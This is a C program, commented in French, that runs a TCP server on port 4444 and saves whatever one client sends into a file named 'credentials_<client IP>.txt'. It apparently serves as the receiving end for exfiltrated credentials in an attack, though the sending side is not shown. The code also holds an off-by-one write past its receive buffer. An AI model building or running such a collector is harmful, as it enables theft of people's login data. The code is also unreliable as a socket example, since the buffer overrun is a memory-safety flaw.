#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 4444
#define BUFFER_SIZE 1024

int main() {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    char buffer[BUFFER_SIZE];
    socklen_t client_addr_len = sizeof(client_addr);
    FILE *file;

    // Création du socket
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Erreur lors de la création du socket");
        exit(EXIT_FAILURE);
    }

    // Configuration de l'adresse du serveur
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Liaison du socket
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur lors de la liaison");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // Écoute des connexions
    if (listen(server_sock, 1) < 0) {
        perror("Erreur lors de l'écoute");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("Serveur en écoute sur le port %d...\n", PORT);

    // Acceptation d'une connexion
    client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len);
    if (client_sock < 0) {
        perror("Erreur lors de l'acceptation de la connexion");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // Récupération de l'adresse IP du client
    char *client_ip = inet_ntoa(client_addr.sin_addr);
    printf("Connexion acceptée depuis %s\n", client_ip);

    // Construction du nom de fichier basé sur l'adresse IP
    char filename[128];
    snprintf(filename, sizeof(filename), "credentials_%s.txt", client_ip);

    // Ouverture du fichier pour écrire les credentials
    file = fopen(filename, "w"); // Écrase les anciennes données si le fichier existe
    if (!file) {
        perror("Erreur lors de l'ouverture du fichier");
        close(client_sock);
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("Sauvegarde des données dans le fichier : %s\n", filename);

    // Réception des données
    ssize_t bytes_received;
    while ((bytes_received = recv(client_sock, buffer, BUFFER_SIZE, 0)) > 0) {
        buffer[bytes_received] = '\0'; // Ajout d'une terminaison de chaîne
        fprintf(file, "%s", buffer);
    }

    if (bytes_received < 0) {
        perror("Erreur lors de la réception des données");
    } else {
        printf("Fichier %s reçu avec succès.\n", filename);
    }

    // Fermeture des connexions et du fichier
    fclose(file);
    close(client_sock);
    close(server_sock);

    return 0;
}


